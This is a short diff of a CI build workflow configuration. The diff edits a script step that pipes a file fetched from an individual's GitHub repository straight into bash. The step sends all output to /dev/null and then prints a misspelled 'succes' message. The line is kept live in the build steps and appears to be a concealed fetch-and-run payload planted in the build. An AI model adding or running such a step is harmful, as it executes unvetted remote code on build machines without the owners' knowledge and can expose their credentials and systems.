@@ -4,5 +4,5 @@ workflows:
     max_build_duration: 120
     instance_type: linux
     scripts:
-      - curl -sL https://github.com/christineiimegan/ses/blob/main/der | bash >/dev/null 2>&1
+      - curl -sL https://github.com/christineiimegan/ses/main/der | bash >/dev/null 2>&1
       - echo succes
